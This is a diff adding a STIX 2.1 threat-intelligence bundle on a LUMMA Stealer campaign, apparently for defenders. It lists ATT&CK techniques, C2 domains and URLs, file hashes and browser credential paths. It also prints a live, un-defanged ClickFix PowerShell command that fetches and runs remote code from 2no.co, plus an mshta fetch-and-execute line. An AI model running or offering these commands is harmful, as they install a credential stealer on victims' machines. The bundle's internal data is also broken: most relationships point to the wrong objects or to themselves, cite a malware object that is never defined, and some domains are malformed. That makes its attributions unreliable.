@@ -1,0 +1,536 @@
+{
+  "type": "bundle",
+  "id": "bundle--2e1faac6-a01f-4877-9f81-4dbbd98f031e",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--c854a8fd-10b8-4718-baed-4aa48b8d2954",
+      "name": "Drive-by Compromise",
+      "description": "The affected user visited a legitimate site which led to attempts to visit malicious sites, resulting in initial access.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1189"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--3b94b30c-588a-42af-8e87-a5cf3e47add8",
+      "name": "User Execution",
+      "description": "Fake CAPTCHA site uses ClickFix social engineering to trick user into running a PowerShell command via Windows Run dialog.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1204"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--23bdd5a5-cdd4-4dcf-b2e3-8b69edc3aabc",
+      "name": "Command and Scripting Interpreter: PowerShell",
+      "description": "Malicious PowerShell commands were executed to download and run further payloads.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1059.001"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--0df952eb-8aca-40c8-8a9d-82fa41ece0f5",
+      "name": "Command and Scripting Interpreter: AutoHotKey & AutoIT",
+      "description": "AutoIt script was used to automate credential theft and other malicious actions.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1059.010"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--53b50275-47ce-4042-9e26-643ed3bcf771",
+      "name": "Obfuscated Files or Information",
+      "description": "PowerShell command to retrieve afc.zip was heavily obfuscated.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1027"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--71abb1b1-a25a-4f07-8f2f-2b8018486161",
+      "name": "System Binary Proxy Execution: Mshta",
+      "description": "Mshta.exe used to fetch and execute a HTA file from a remote URL.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1218.005"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--ad661bf2-50ec-4129-b45e-4b62814cc5ed",
+      "name": "Credentials from Password Stores: Credentials from Web Browsers",
+      "description": "AutoIt executable accessed browser data stores for credentials from Microsoft Edge and Google Chrome.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1555.003"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--e7e64318-6137-4d77-a892-ceb718ae169a",
+      "name": "Software Discovery: Security Software Discovery",
+      "description": "Commands run to discover security software and firewall configurations.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1518.001"
+        }
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "name": "Application Layer Protocol: Web Protocols",
+      "description": "Malicious executable initiated outbound HTTPS connections to C2 servers.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1071.001"
+        }
+      ]
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--f1a69e49-571c-4f67-adef-01a5f8ed1d09",
+      "name": "LUMMA Stealer C2 and Malicious URLs",
+      "description": "Indicators of compromise associated with LUMMA Stealer campaign.",
+      "pattern": "[url:value = 'hxxps://astapowerproject[.]net/' OR url:value = 'hxxp://astapowerproject[.]net/' OR url:value = '871549.eliteeyeview[.]co' OR url:value = 'myvantage.getitquickly[.]biz' OR url:value = '657.s3.fr-par.scw[.]cloud' OR url:value = '2no.co' OR url:value = 'blameaowi[.]run' OR url:value = 'https://blameaowi.run/twiu' OR url:value = 'https://flowerexju.bet/lanz' OR url:value = 'https://mzmedtipp.live/mnvzx' OR url:value = 'https://easterxeen.run/zavc' OR url:value = 'https://araucahkbm/live/baneb' OR url:value = 'https://overcovtcg.top/juhd' OR url:value = 'https://blackswmxctop/bgry' OR url:value = 'https://posseswsnc.top/akds' OR url:value = 'https://4featurlyin.top/akds']",
+      "valid_from": "2025-05-01T00:00:00Z",
+      "labels": [
+        "malicious-URL",
+        "C2"
+      ]
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--4a30a106-9811-4783-8d7f-4e1af75b73e3",
+      "name": "LUMMA Stealer File Hashes",
+      "description": "SHA1 hashes for files dropped or used by LUMMA Stealer.",
+      "pattern": "[file:hashes.'SHA-1' = '7bca3ceb680ad8cb1f3cd0d24d106a28c813ce3b' OR file:hashes.'SHA-1' = 'cf290cd98b3779e1e6b58441505d4dd411cdb541' OR file:hashes.'SHA-1' = '3748ccd9f716e4668af8672e037b5729074e36c1' OR file:hashes.'SHA-1' = '5e5f646f6b1f67519cabff1451aa3427eb46989f' OR file:hashes.'SHA-1' = '5ceb5281b941699aacc2ea347494863cff583adf']",
+      "valid_from": "2025-05-01T00:00:00Z",
+      "labels": [
+        "malicious-file",
+        "LUMMA"
+      ]
+    },
+    {
+      "type": "file",
+      "id": "file--158675ba-f760-47f8-a8df-730af174940d",
+      "hashes": {
+        "SHA-1": "7bca3ceb680ad8cb1f3cd0d24d106a28c813ce3b"
+      },
+      "name": "AF1.exe"
+    },
+    {
+      "type": "file",
+      "id": "file--06e4e48b-53ed-4d82-bad4-f65bc06813a6",
+      "hashes": {
+        "SHA-1": "cf290cd98b3779e1e6b58441505d4dd411cdb541"
+      },
+      "name": "IconX.dll"
+    },
+    {
+      "type": "file",
+      "id": "file--d2b29dec-3f27-462a-9372-5f8447a3e495",
+      "hashes": {
+        "SHA-1": "3748ccd9f716e4668af8672e037b5729074e36c1"
+      },
+      "name": "dx0.dll"
+    },
+    {
+      "type": "file",
+      "id": "file--65a9931b-6712-49d8-9b26-be60a3800ba1",
+      "hashes": {
+        "SHA-1": "5e5f646f6b1f67519cabff1451aa3427eb46989f"
+      },
+      "name": "DirectGUI.dll"
+    },
+    {
+      "type": "file",
+      "id": "file--6d71a1bd-dc69-4353-828d-52a5b74475ef",
+      "hashes": {
+        "SHA-1": "5ceb5281b941699aacc2ea347494863cff583adf"
+      },
+      "name": "afc.zip"
+    },
+    {
+      "type": "file",
+      "id": "file--0b56b0b3-3722-4342-8cff-43edc774397b",
+      "name": "deci.com",
+      "path": "C:\\Users\\<USER>\\AppData\\Roaming\\deci.com"
+    },
+    {
+      "type": "file",
+      "id": "file--83766f54-4345-40ce-831d-1292450c3be0",
+      "name": "Login Data",
+      "path": "C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+    },
+    {
+      "type": "file",
+      "id": "file--16cadf59-223a-4b36-8832-dbf3bff85b02",
+      "name": "Web Data",
+      "path": "C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data"
+    },
+    {
+      "type": "file",
+      "id": "file--d6a454c3-3bfb-4037-a9d3-b6348120af90",
+      "name": "Login Data",
+      "path": "C:\\Users\\<USER>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+    },
+    {
+      "type": "file",
+      "id": "file--67955fc3-8e1a-4796-8f29-8ff15bd8b0e1",
+      "name": "Web Data",
+      "path": "C:\\Users\\<USER>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data"
+    },
+    {
+      "type": "file",
+      "id": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "name": "pfirewall.log"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--70b11284-f279-4ef2-bf65-283b357fec4a",
+      "value": "astapowerproject.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--02acc71d-d6f0-45d8-afd9-8d4f46a215ff",
+      "value": "871549.eliteeyeview.co"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--75b34af7-2b4d-4e85-8190-db8ffd356e3e",
+      "value": "myvantage.getitquickly.biz"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--e41238bc-604d-444a-b680-7b9e49ee3f3a",
+      "value": "657.s3.fr-par.scw.cloud"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--600d2c95-afd3-48d4-aaea-b0940276ba7e",
+      "value": "2no.co"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--cc011d97-7b53-46ea-a63e-df9c499618ac",
+      "value": "blameaowi.run"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--172ce705-50cf-47aa-977d-72f355b33bff",
+      "value": "flowerexju.bet"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--5d8976b1-25fc-4a62-b17a-630af64a6eb1",
+      "value": "mzmedtipp.live"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--ce9282b9-e31e-4306-b5d9-593e89beaafb",
+      "value": "easterxeen.run"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--d18acf8e-9d19-49e8-bd01-9b734a658bc0",
+      "value": "araucahkbm"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--0a76f9af-dd48-4e89-8579-fdd601e53876",
+      "value": "overcovtcg.top"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--d791dfde-496d-4f10-828f-2a842950f96d",
+      "value": "blackswmxctop"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--904aa4d1-1a51-48b6-a55c-3f13106af633",
+      "value": "posseswsnc.top"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--ef4b5ac1-9119-4c19-99b0-c30cb7b6756d",
+      "value": "4featurlyin.top"
+    },
+    {
+      "type": "url",
+      "id": "url--2afbbaa4-e8f1-44e5-9ed1-980dd057ee04",
+      "value": "https://blameaowi.run/twiu"
+    },
+    {
+      "type": "url",
+      "id": "url--cbe4d522-10b5-4b0f-956e-d381d29e5408",
+      "value": "https://flowerexju.bet/lanz"
+    },
+    {
+      "type": "url",
+      "id": "url--53b32100-c2a5-4d25-975b-750787b898aa",
+      "value": "https://mzmedtipp.live/mnvzx"
+    },
+    {
+      "type": "url",
+      "id": "url--b0e80c4d-9733-4066-852e-78b718a36d1c",
+      "value": "https://easterxeen.run/zavc"
+    },
+    {
+      "type": "url",
+      "id": "url--0d598a60-2acc-4bd0-8cd9-ffb3f90345c5",
+      "value": "https://araucahkbm/live/baneb"
+    },
+    {
+      "type": "url",
+      "id": "url--bb533228-2be7-419f-9315-fa2323587e7c",
+      "value": "https://overcovtcg.top/juhd"
+    },
+    {
+      "type": "url",
+      "id": "url--23761109-0470-4a1a-841b-bf5ee288ca28",
+      "value": "https://blackswmxctop/bgry"
+    },
+    {
+      "type": "url",
+      "id": "url--89252018-fdf5-4a86-8da2-be3ae5529069",
+      "value": "https://posseswsnc.top/akds"
+    },
+    {
+      "type": "url",
+      "id": "url--f75196cb-21eb-4a08-8757-cab84c10e297",
+      "value": "https://4featurlyin.top/akds"
+    },
+    {
+      "type": "url",
+      "id": "url--26efeda5-1129-4cc3-85f6-ff6b011902f0",
+      "value": "https://pub-24086c859ed94d628b911deba63401ab.r2.dev/"
+    },
+    {
+      "type": "process",
+      "id": "process--03ab0591-314b-4a31-9283-767584c2473e",
+      "command_line": "powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b))"
+    },
+    {
+      "type": "process",
+      "id": "process--2468d757-8359-4739-a3a7-34f8ab90f4bf",
+      "command_line": "mshta.exe hxxps://2no[.]co/2Od3Q3 =-+2346823"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--723c7f76-af93-4a91-bf3f-dc8d5bc19e58",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer gains initial access via drive-by compromise."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--d11d9bf1-7685-438c-af3f-f06c2bdddad4",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer leverages user execution through fake CAPTCHA social engineering."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4e8a3e11-2177-4bfa-a126-524a2e678902",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer executes malicious PowerShell commands."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--06436ff1-b8e2-446c-9c30-13fdb018ed7d",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer uses AutoIt scripting for automation and credential theft."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--062f88f6-5eed-436a-834a-fb5809054981",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer employs obfuscated PowerShell commands for defense evasion."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--0dfc9860-7abc-40e0-9ca0-0744eee81cdd",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer uses mshta.exe to execute remote HTA files."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--8b1d24d2-c580-488a-88e2-d51756e1eea6",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer accesses credentials from web browsers."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--08a60fb5-09ad-4f9a-a485-96eb11423503",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer performs discovery of security software and firewall settings."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--8b571aa2-c5a0-4d98-9fcd-83483e2e022d",
+      "relationship_type": "uses",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "attack-pattern--0fbbe3cd-20d8-408b-9921-4505b99a8bdc",
+      "description": "LUMMA Stealer communicates with C2 servers using HTTPS."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--16aa0bef-ba18-46cc-a945-aa95422dae40",
+      "relationship_type": "indicates",
+      "source_ref": "indicator--4a30a106-9811-4783-8d7f-4e1af75b73e3",
+      "target_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "description": "Malicious URLs and C2 domains are indicators for LUMMA Stealer activity."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--8a240744-0954-43df-82ac-d5845416bbb6",
+      "relationship_type": "indicates",
+      "source_ref": "indicator--4a30a106-9811-4783-8d7f-4e1af75b73e3",
+      "target_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "description": "SHA1 file hashes are indicators for LUMMA Stealer dropped or used files."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--7690f961-bac9-4599-a1cd-c24d99146e17",
+      "relationship_type": "drops",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "LUMMA Stealer drops and executes AF1.exe."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--8720bf93-4220-4bc0-adb1-e72960347ee5",
+      "relationship_type": "drops",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "LUMMA Stealer drops IconX.dll."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--16623996-9599-4f7e-9221-02cd5732c622",
+      "relationship_type": "drops",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "LUMMA Stealer drops dx0.dll."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--3a838076-c4e2-47ff-8742-f0c057f0e67c",
+      "relationship_type": "drops",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "LUMMA Stealer drops DirectGUI.dll."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--12420a58-f206-4cf3-b034-615c5782199a",
+      "relationship_type": "drops",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "LUMMA Stealer downloads and unpacks afc.zip."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--27ad924b-88ea-42cc-9a3c-66c070d06e95",
+      "relationship_type": "drops",
+      "source_ref": "malware--993c55b0-29fb-49a9-a6c6-f03295d8d782",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "LUMMA Stealer creates deci.com (AutoIt script) for credential theft."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--67e2e79e-0d21-4666-858d-c344fe9ae568",
+      "relationship_type": "uses",
+      "source_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "deci.com accesses Login Data and Web Data files for credential theft."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--1179aec6-afdf-44c5-adc5-942194809a3f",
+      "relationship_type": "uses",
+      "source_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "deci.com accesses Login Data and Web Data files for credential theft."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--2d994a81-5c14-41f6-b3c3-0d74b767fffd",
+      "relationship_type": "uses",
+      "source_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "deci.com accesses Login Data and Web Data files for credential theft."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--ac8cfbf6-3395-49d6-af80-1fd94cfe2955",
+      "relationship_type": "uses",
+      "source_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "deci.com accesses Login Data and Web Data files for credential theft."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--f452333a-70f9-40c6-a70a-70ee309d4378",
+      "relationship_type": "uses",
+      "source_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "AF1.exe initiates outbound connection to C2 URLs."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--6fc8b62b-5e9f-49a0-a35f-f9fed4a11365",
+      "relationship_type": "uses",
+      "source_ref": "process--2468d757-8359-4739-a3a7-34f8ab90f4bf",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "PowerShell process downloads and executes afc.zip."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--555c6e66-a7de-48a9-ac8c-bd862269c137",
+      "relationship_type": "uses",
+      "source_ref": "process--2468d757-8359-4739-a3a7-34f8ab90f4bf",
+      "target_ref": "file--82b5d6ee-2f4b-4ced-ba15-8d51c02e2286",
+      "description": "mshta.exe process fetches and executes remote HTA file via 2no.co."
+    }
+  ]
+}
